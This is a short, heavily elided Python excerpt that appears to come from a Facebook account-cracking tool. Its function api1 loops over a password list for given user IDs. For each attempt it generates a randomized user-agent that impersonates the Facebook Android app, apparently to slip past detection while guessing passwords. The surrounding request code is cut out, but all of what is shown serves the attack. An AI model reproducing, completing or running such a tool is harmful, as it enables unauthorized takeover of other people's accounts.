...
def api1(ids,names,passlist):
        try:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+"FBAV/143.41.34.72;FBBV/46124851;FBDM/{density=2.3,width=1338,height=1838};FBLC/en_US;FBRV/30016970;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/4.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                li = ['28','29','210']
